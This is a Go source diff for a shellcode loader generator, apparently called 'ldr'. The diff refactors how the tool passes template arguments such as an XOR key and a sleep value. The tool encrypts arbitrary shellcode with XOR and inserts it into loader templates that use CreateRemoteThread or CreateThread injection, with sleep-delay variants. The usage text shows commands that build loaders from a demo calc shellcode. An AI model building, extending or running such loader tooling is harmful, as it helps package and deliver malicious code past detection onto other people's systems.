@@ -6,6 +6,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+
 	"gopkg.in/yaml.v2"
 )
 
@@ -42,7 +43,7 @@ var (
 	outputPath    = flag.String("out", "", "Output folder")
 	ldrToken      = flag.String("ldr", "", "Loader token")
 	enc           = flag.String("enc", "", "Encryption type (optional)")
-	key           = flag.String("key", "", "Encryption key (optional)")
+	args          = flag.String("args", "", "Arguments to be passed to the loader (optional)")
 	template_path = flag.String("template", "", "Path to template folder (default: ./template)")
 	cleanup       = flag.Bool("cleanup", false, "Cleanup? (delete encrypted shellcode file)")
 	help          = flag.Bool("help", false, "Print help")
@@ -72,10 +73,9 @@ Options:
                      Supported types: [xor]
                      Example: -enc xor
 
-  -key <key>       Encryption key for the specified encryption type. (Optional)
-                     Example: -key mySecretKey1234
-                     Default: aaaabbbbccccdddd
-
+  -args <args>     Arguments to be passed to the loader's template. (Optional)
+                     Example: -args "key=mySecretKey1234,pid=1234"
+					 
   -template <path> Path to the template folder to be used for generating the loader. (Optional)
                      Example: -template /path/to/custom/template
                      Default: ./template
@@ -89,8 +89,9 @@ Examples:
   ./ldr -bin ./dev/calc_shellcode/calc.bin -out ./output -ldr CreateRemoteThread 
   ./ldr -bin ./dev/calc_shellcode/calc.bin -out ./output -ldr CreateThread
 
-  ./ldr -bin ./dev/calc_shellcode/calc.bin -out ./output -ldr Inline_Xor -enc xor -key mySecretKey1234 --cleanup
-  ./ldr -bin ./dev/calc_shellcode/calc.bin -out ./output -ldr CreateThread_Xor -enc xor -key mySecretKey1234 --cleanup
+  ./ldr -bin ./dev/calc_shellcode/calc.bin -out ./output -ldr Inline_Xor -enc xor -args "key=test" -cleanup
+  ./ldr -bin ./dev/calc_shellcode/calc.bin -out ./output -ldr CreateThread_Xor -enc xor -args "key=test" -cleanup  
+  ./ldr -bin ./dev/calc_shellcode/calc.bin -out ./output -ldr CreateThread_Xor_Sleep -enc xor -args "key=test, sleep=5" -cleanup
 `
 	fmt.Println(text)
 }
@@ -177,44 +178,42 @@ func ToCArray(filePath string) (string, error) {
 	return fmt.Sprintf("{ %s }", strings.Join(byteArray, ", ")), nil
 }
 
-func ProcessShellcodeTemplate(binPath string, args ...string) error {
-	if len(args) > 1 {
-		enc := args[0]
-		key := args[1]
+func ProcessShellcodeTemplate(binPath string, enc string, args map[string]string) error {
+	switch enc {
+	case "xor":
+		key := args["key"]
+		// TODO: this can error out if key is not provided, remember to validate
 
-		switch enc {
-		case "xor":
-			fmt.Println("[!!!] XORing shellcode with key:", key)
-			shellcode, err := os.ReadFile(binPath)
-			if err != nil {
-				return err
-			}
-
-			var byteArray []string
-			for _, b := range shellcode {
-				byteArray = append(byteArray, fmt.Sprintf("0x%02X", b))
-			}
-
-			ba := fmt.Sprintf("{ %s }", strings.Join(byteArray, ", "))
-
-			fmt.Println("[Sanity Check] Starting bytes (before XOR): ", ba[0:24], "... }")
-
-			for i := 0; i < len(shellcode); i++ {
-				shellcode[i] ^= key[i%len(key)]
-			}
-
-			err = os.WriteFile(binPath+".enc", shellcode, 0o644)
-			if err != nil {
-				return err
-			}
-
-			binPath = binPath + ".enc"
-			/* I'm sorry */
-
-			fmt.Printf("[*] Encrypted shellcode saved to: %s\n\n", binPath)
-
-		default:
+		fmt.Println("[!!!] XORing shellcode with key:", key)
+		shellcode, err := os.ReadFile(binPath)
+		if err != nil {
+			return err
 		}
+
+		var byteArray []string
+		for _, b := range shellcode {
+			byteArray = append(byteArray, fmt.Sprintf("0x%02X", b))
+		}
+
+		ba := fmt.Sprintf("{ %s }", strings.Join(byteArray, ", "))
+
+		fmt.Println("[Sanity Check] Starting bytes (before XOR): ", ba[0:24], "... }")
+
+		for i := 0; i < len(shellcode); i++ {
+			shellcode[i] ^= key[i%len(key)]
+		}
+
+		err = os.WriteFile(binPath+".enc", shellcode, 0o644)
+		if err != nil {
+			return err
+		}
+
+		binPath = binPath + ".enc"
+		/* I'm sorry */
+
+		fmt.Printf("[*] Encrypted shellcode saved to: %s\n\n", binPath)
+
+	default:
 	}
 
 	shellcodeArray, err := ToCArray(binPath)
@@ -266,15 +265,23 @@ func ProcessShellcodeTemplate(binPath string, args ...string) error {
 	return nil
 }
 
-func ProcessLoaderTemplate(token string, args ...string) error {
-	var enc string
-	var key string
+func parseArgs(arg []string) (map[string]string, error) {
+	result := make(map[string]string)
+	for _, pair := range arg {
+		parts := strings.SplitN(strings.TrimSpace(pair), "=", 2)
+		if len(parts) != 2 {
+			return nil, fmt.Errorf("invalid argument: %s", pair)
+		}
 
-	if len(args) > 0 {
-		enc = args[0]
-		key = args[1]
+		key := strings.TrimSpace(parts[0])
+		value := strings.TrimSpace(parts[1])
+
+		result[key] = value
 	}
+	return result, nil
+}
 
+func ProcessLoaderTemplate(token string, enc string, template_args map[string]string) error {
 	method := tokenMethod(token)
 	fmt.Println("[LDR] Using:", method)
 
@@ -291,18 +298,6 @@ func ProcessLoaderTemplate(token string, args ...string) error {
 				}
 			}
 
-			if l.KeyRequired {
-				if key != "" {
-					fmt.Println("[LDR] Using key:", key)
-				} else {
-					fmt.Println("[LDR] Warning: Key not specified, using default key:", key)
-				}
-			} else {
-				if key != "" {
-					fmt.Println("[LDR] Warning: Key specified, but not needed for this loader token:", token)
-				}
-			}
-
 			fmt.Println("[LDR] Using:", l.Token)
 			for _, f := range l.Files {
 				content, err := ReadFile(filepath.Join(*template_path, f.SourcePath))
@@ -310,13 +305,11 @@ func ProcessLoaderTemplate(token string, args ...string) error {
 					return err
 				}
 
-				for k, v := range f.Substitutions {
-					switch k {
-					case "key":
-						if key != "" {
-							content = strings.ReplaceAll(content, v, key)
-						} else {
-							content = strings.ReplaceAll(content, v, "aaaabbbbccccdddd")
+				for k, v := range template_args {
+					for s, r := range f.Substitutions {
+						if strings.EqualFold(k, s) {
+							fmt.Println("[TEMPLATING] Replacing:", r, "with:", v)
+							content = strings.ReplaceAll(content, r, v)
 						}
 					}
 				}
@@ -388,26 +381,26 @@ func init() {
 		fmt.Println("[*] Encryption type specified, but not needed for this loader token:", *ldrToken)
 		os.Exit(0)
 	}
-
-	if !needsEnc && *key != "" {
-		fmt.Println("[*] Encryption key specified, but not needed for this loader token:", *ldrToken)
-		os.Exit(0)
-	}
-
-	if needsEnc && *key == "" {
-		fmt.Println("[*] Encryption key not specified, using default key: aaaabbbbccccdddd")
-		*key = "aaaabbbbccccdddd"
-	}
 }
 
 func main() {
-	err := ProcessShellcodeTemplate(*binPath, *enc, *key)
+	template_args := make(map[string]string)
+	if *args != "" {
+		var err error
+		template_args, err = parseArgs(strings.Split(*args, ","))
+		if err != nil {
+			fmt.Println("[!] Error parsing arguments:", err)
+			return
+		}
+	}
+
+	err := ProcessShellcodeTemplate(*binPath, *enc, template_args)
 	if err != nil {
 		fmt.Println("Error processing shellcode:", err)
 		return
 	}
 
-	err = ProcessLoaderTemplate(strings.ToLower(*ldrToken), *enc, *key)
+	err = ProcessLoaderTemplate(strings.ToLower(*ldrToken), *enc, template_args)
 	if err != nil {
 		fmt.Println("Error processing loader:", err)
 		return
